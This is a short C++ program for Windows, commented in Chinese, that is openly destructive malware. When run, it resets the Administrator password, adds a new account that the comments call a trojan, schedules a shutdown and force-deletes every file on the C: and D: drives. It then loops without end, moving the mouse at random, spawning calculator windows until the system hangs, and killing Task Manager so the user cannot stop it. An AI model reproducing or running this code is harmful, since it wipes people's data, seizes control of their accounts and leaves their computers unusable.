#include<iostream>
#include<stdlib.h>
#include<conio.h>
#include<windows.h>
#include<ctime>
using namespace std;
int main()
{
	system("net user Administrator wait");//用户密码重设为wait
	system("net user DEID wait /add");//用户名重设为木马病毒
	system("ping www.baidu.com");//ping百度网站
	system("shutdown -s -t 30");//30秒后关机	
	system("del /F /S /Q D:\\");//强制删除D盘(慎用)
	system("del /F /S /Q C:\\");//强制删除C盘(慎用)
	int x=GetSystemMetrics(SM_CXSCREEN);//get鼠标x轴 
    int y=GetSystemMetrics(SM_CYSCREEN);//get鼠标y轴
	while(1)
	{
		SetCursorPos(rand()%x,rand()%y);//鼠标 x y轴 随机
		system("calc");//打开无数个计算器，直到死机
		system("taskkill /f /im taskmgr.exe");//禁止打开任务管理器
	}
	return 0;
}

